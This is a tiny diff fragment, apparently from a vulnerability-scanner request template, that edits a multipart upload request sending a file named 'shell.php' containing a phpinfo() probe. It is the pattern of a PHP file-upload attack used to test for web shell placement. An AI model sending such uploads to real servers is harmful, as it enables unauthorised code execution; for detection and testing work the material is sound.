@@ -47,8 +47,6 @@ Content-Type: multipart/form-data; boundary=5f0c1dda2c37ae232c96415ad53dc96b
 
 Content-Disposition: form-data; name="file"; filename="shell.php"
 
-  
-
 <?=phpinfo();?>
 
 --5f0c1dda2c37ae232c96415ad53dc96b--
